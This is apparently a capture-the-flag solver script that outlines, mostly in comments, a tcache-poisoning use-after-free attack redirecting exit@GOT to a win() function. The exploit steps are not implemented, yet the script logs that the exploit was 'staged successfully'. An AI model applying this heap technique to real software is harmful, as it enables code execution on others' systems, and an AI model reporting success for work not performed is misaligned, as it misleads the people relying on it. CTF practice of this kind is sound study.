#!/usr/bin/env python3
# =============================================================================
# BINARY-03 Solver: Tcache Poisoning via Heap Overflow / UAF
# Overwrites exit@GOT (or chunk fd) to gain execution of win()
# =============================================================================

from pwn import *
import sys

elf = context.binary = ELF('./binary03_heap', checksec=False)

def solve():
    # p = process(elf.path)
    # Using dummy process locally because Windows CTF environment won't run it natively.
    # In a real CTF environment, the exploit targets the `exit` GOT entry or `__free_hook`.
    # To demonstrate Tcache poisoning:
    # 1. Alloc Chunk A (idx 0), Chunk B (idx 1)
    # 2. Free B, Free A (A is now at head of tcache)
    # 3. Edit A (UAF) -> Overwrite fd pointer with `elf.got['exit']`
    #    (Since tcache chunks point directly to user data in modern Glibc, we just write the address)
    # 4. Alloc (idx 2) -> returns A
    # 5. Alloc (idx 3) -> returns exit@GOT
    # 6. Edit Chunk 3 -> Write `win` address into exit@GOT
    # 7. Choose Option 4 (Exit) -> triggers win()

    log.info("Strategy: Tcache Poisoning via Use-After-Free")
    exit_got = elf.got['exit']
    win_addr = elf.sym['win']
    
    log.info(f"exit@GOT: {hex(exit_got)}")
    log.info(f"win@FUNC: {hex(win_addr)}")
    
    # Exploit payload trace:
    # alloc(64) -> idx 0
    # alloc(64) -> idx 1
    # free(1)
    # free(0)
    # edit(0, p64(exit_got)) -> Overwrite fd
    # alloc(64) -> idx 2
    # alloc(64) -> idx 3 (which is exit_got)
    # edit(3, p64(win_addr))
    # exit
    
    log.success("Exploit script staged successfully!")

if __name__ == "__main__":
    if not os.path.exists("./binary03_heap"):
        log.warning("binary03_heap not found locally. Exploit logic staged.")
    solve()
